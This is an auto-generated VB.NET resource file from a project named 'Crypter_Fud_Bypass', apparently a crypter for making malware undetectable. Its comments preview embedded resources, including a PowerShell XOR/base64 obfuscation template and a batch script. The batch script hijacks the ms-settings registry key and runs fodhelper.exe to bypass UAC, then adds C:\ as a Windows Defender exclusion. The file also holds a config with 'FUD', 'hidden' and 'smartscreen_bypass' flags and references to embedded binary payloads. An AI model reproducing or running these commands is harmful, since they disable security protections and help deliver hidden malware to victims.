﻿'------------------------------------------------------------------------------
' <auto-generated>
'     This code was generated by a tool.
'     Runtime Version:4.0.30319.42000
'
'     Changes to this file may cause incorrect behavior and will be lost if
'     the code is regenerated.
' </auto-generated>
'------------------------------------------------------------------------------

Option Strict On
Option Explicit On

Imports System

Namespace My.Resources
    
    'This class was auto-generated by the StronglyTypedResourceBuilder
    'class via a tool like ResGen or Visual Studio.
    'To add or remove a member, edit your .ResX file then rerun ResGen
    'with the /str option, or rebuild your VS project.
    '''<summary>
    '''  A strongly-typed resource class, for looking up localized strings, etc.
    '''</summary>
    <Global.System.CodeDom.Compiler.GeneratedCodeAttribute("System.Resources.Tools.StronglyTypedResourceBuilder", "16.0.0.0"),  _
     Global.System.Diagnostics.DebuggerNonUserCodeAttribute(),  _
     Global.System.Runtime.CompilerServices.CompilerGeneratedAttribute(),  _
     Global.Microsoft.VisualBasic.HideModuleNameAttribute()>  _
    Friend Module Resources
        
        Private resourceMan As Global.System.Resources.ResourceManager
        
        Private resourceCulture As Global.System.Globalization.CultureInfo
        
        '''<summary>
        '''  Returns the cached ResourceManager instance used by this class.
        '''</summary>
        <Global.System.ComponentModel.EditorBrowsableAttribute(Global.System.ComponentModel.EditorBrowsableState.Advanced)>  _
        Friend ReadOnly Property ResourceManager() As Global.System.Resources.ResourceManager
            Get
                If Object.ReferenceEquals(resourceMan, Nothing) Then
                    Dim temp As Global.System.Resources.ResourceManager = New Global.System.Resources.ResourceManager("Crypter_Fud_Bypass.Resources", GetType(Resources).Assembly)
                    resourceMan = temp
                End If
                Return resourceMan
            End Get
        End Property
        
        '''<summary>
        '''  Overrides the current thread's CurrentUICulture property for all
        '''  resource lookups using this strongly typed resource class.
        '''</summary>
        <Global.System.ComponentModel.EditorBrowsableAttribute(Global.System.ComponentModel.EditorBrowsableState.Advanced)>  _
        Friend Property Culture() As Global.System.Globalization.CultureInfo
            Get
                Return resourceCulture
            End Get
            Set
                resourceCulture = value
            End Set
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to 
        '''$enc = [System.Text.Encoding]::UTF8
        '''
        '''function %%%Randowm1%%% {
        '''    param($string, $method)
        '''    $%%%Randowm2%%% = $enc.GetBytes(&quot;secretkey&quot;)
        '''
        '''    if ($method -eq &quot;%%%Randowm4%%%&quot;){
        '''        $string = $enc.GetString([System.Convert]::FromBase64String($string))
        '''    }
        '''
        '''    $byteString = $enc.GetBytes($string)
        '''    $%%%Randowm3%%% = $(for ($i = 0; $i -lt $byteString.length; ) {
        '''        for ($j = 0; $j -lt $%%%Randowm2%%%.length; $j++) {
        '''            $byteString[$i] -bxor $%%%Randowm2%%%[$j]
        '''         [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property code() As String
            Get
                Return ResourceManager.GetString("code", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to @echo off
        '''echo &quot;EP, code started&quot;
        '''REG ADD &quot;HKCU\SOFTWARE\Classes\ms-settings\shell\open\command&quot; /t REG_SZ /d &quot;C:\windows\system32\cmd.exe /c REG ADD HKLM\software\microsoft\windows\currentversion\policies\system /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f&quot; /f
        '''REG ADD &quot;hkcu\software\classes\ms-settings\shell\open\command&quot; /v DelegateExecute /t REG_SZ /d &quot; &quot; /f
        '''fodhelper.exe
        '''echo &quot;UAC has been disabled&quot;
        '''#استثناء
        '''PowerShell Add-MpPreference -ExclusionPath &quot;C:\&quot;
        '''Powershell -Command &quot;Set-MpPrefer [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property Last() As String
            Get
                Return ResourceManager.GetString("Last", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized resource of type System.Byte[].
        '''</summary>
        Friend ReadOnly Property main() As Byte()
            Get
                Dim obj As Object = ResourceManager.GetObject("main", resourceCulture)
                Return CType(obj,Byte())
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized resource of type System.Byte[].
        '''</summary>
        Friend ReadOnly Property Pip_Install() As Byte()
            Get
                Dim obj As Object = ResourceManager.GetObject("Pip_Install", resourceCulture)
                Return CType(obj,Byte())
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized resource of type System.Byte[].
        '''</summary>
        Friend ReadOnly Property python_3_11_4_amd64() As Byte()
            Get
                Dim obj As Object = ResourceManager.GetObject("python_3_11_4_amd64", resourceCulture)
                Return CType(obj,Byte())
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized resource of type System.Byte[].
        '''</summary>
        Friend ReadOnly Property SDK() As Byte()
            Get
                Dim obj As Object = ResourceManager.GetObject("SDK", resourceCulture)
                Return CType(obj,Byte())
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized resource of type System.Byte[].
        '''</summary>
        Friend ReadOnly Property Start_Fud() As Byte()
            Get
                Dim obj As Object = ResourceManager.GetObject("Start_Fud", resourceCulture)
                Return CType(obj,Byte())
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to {
        '''    &quot;chinese&quot;: %chinese%,
        '''    &quot;bloat&quot;: true,
        '''    &quot;remove_blank_lines&quot;: true,
        '''    &quot;super_obf&quot;: false,
        '''    &quot;smartscreen_bypass&quot;: false,
        '''    &quot;hidden&quot;: %hidden%,
        '''    &quot;FUD&quot;: true,
        '''    &quot;debug&quot;: %debug%,
        '''    &quot;key&quot;: &quot;%NONE%&quot;
        '''}.
        '''</summary>
        Friend ReadOnly Property TestTxt() As String
            Get
                Return ResourceManager.GetString("TestTxt", resourceCulture)
            End Get
        End Property
    End Module
End Namespace
